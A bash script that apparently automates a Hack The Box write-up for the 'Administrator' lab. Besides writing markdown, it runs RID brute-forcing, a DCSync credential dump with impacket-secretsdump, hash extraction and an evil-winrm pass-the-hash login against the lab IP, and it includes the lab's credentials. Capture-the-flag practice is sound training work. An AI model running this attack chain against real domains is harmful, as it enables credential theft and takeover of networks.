#!/bin/bash

# HTB Writeup Automation Script
# Author: Siddharth Sharma

# Machine details
MACHINE_NAME="Administrator"
IP="10.10.11.42"
CREDS="olivia:ichliebedich"
DOMAIN="administrator.htb"

# Create writeup file
WRITEUP_FILE="${MACHINE_NAME}_writeup.md"
echo "# Hack The Box - $MACHINE_NAME" > $WRITEUP_FILE
echo "**Author:** Siddharth Sharma" >> $WRITEUP_FILE
echo "" >> $WRITEUP_FILE
echo "## Initial Recon" >> $WRITEUP_FILE
echo "- Target: $IP" >> $WRITEUP_FILE
echo "- Credentials: \`$CREDS\`" >> $WRITEUP_FILE
echo "" >> $WRITEUP_FILE

# Run Nmap scan
echo "### Nmap Scan" >> $WRITEUP_FILE
echo '```bash' >> $WRITEUP_FILE
#echo "sudo nmap -sCV -T4 -p- $IP -vv -Pn" >> $WRITEUP_FILE
#echo '```' >> $WRITEUP_FILE
#echo "" >> $WRITEUP_FILE
#nmap -sCV -T4 -p- $IP -vv -Pn -oN nmap_scan.txt
#echo "![Nmap Scan](nmap_scan.png)" >> $WRITEUP_FILE
echo "" >> $WRITEUP_FILE

# RID Bruteforcing
echo "### RID Bruteforcing with CrackMapExec" >> $WRITEUP_FILE
echo '```bash' >> $WRITEUP_FILE
echo "crackmapexec smb $IP -u olivia -p ichliebedich --rid-brute" >> $WRITEUP_FILE
echo '```' >> $WRITEUP_FILE
crackmapexec smb $IP -u olivia -p ichliebedich --rid-brute > users.txt
echo "![RID Bruteforce](rid_brute.png)" >> $WRITEUP_FILE
echo "" >> $WRITEUP_FILE

# Kerberoasting
echo "### Kerberoasting with Impacket" >> $WRITEUP_FILE
echo '```bash' >> $WRITEUP_FILE
#echo "impacket-GetUserSPNs $DOMAIN/$CREDS -dc-ip $IP -request -usersfile users.txt -outputfile hash" >> $WRITEUP_FILE
#echo '```' >> $WRITEUP_FILE
#echo "![Kerberoasting](kerberoasting.png)" >> $WRITEUP_FILE
echo "" >> $WRITEUP_FILE

# BloodHound Enumeration
echo "### BloodHound Enumeration" >> $WRITEUP_FILE
echo '```bash' >> $WRITEUP_FILE
#echo "bloodhound-python -d $DOMAIN -v --zip -c All -dc $DOMAIN-ns $IP -u olivia -p ichliebedich" >> $WRITEUP_FILE
#echo '```' >> $WRITEUP_FILE
#echo "![BloodHound Zip](bloodhound_zip.png)" >> $WRITEUP_FILE
echo "" >> $WRITEUP_FILE

# DCSync Attack
# DCSync Attack
echo "### DCSync Attack" >> $WRITEUP_FILE
echo '```bash' >> $WRITEUP_FILE
echo "impacket-secretsdump '$DOMAIN'/ethan:'limpbizkit'@$DOMAIN" >> $WRITEUP_FILE
echo '```' >> $WRITEUP_FILE
echo "![SecretsDump](secretsdump.png)" >> $WRITEUP_FILE
echo "" >> $WRITEUP_FILE

# Extract Administrator NTLM hash
ADMIN_HASH=$(impacket-secretsdump "$DOMAIN"/ethan:'limpbizkit'@"$DOMAIN" | grep -i "500" | cut -d ':' -f 4)

# Evil-WinRM Access
echo "### Evil-WinRM Access" >> $WRITEUP_FILE
echo '```bash' >> $WRITEUP_FILE
evil-winrm -i $IP -u administrator -H $ADMIN_HASH
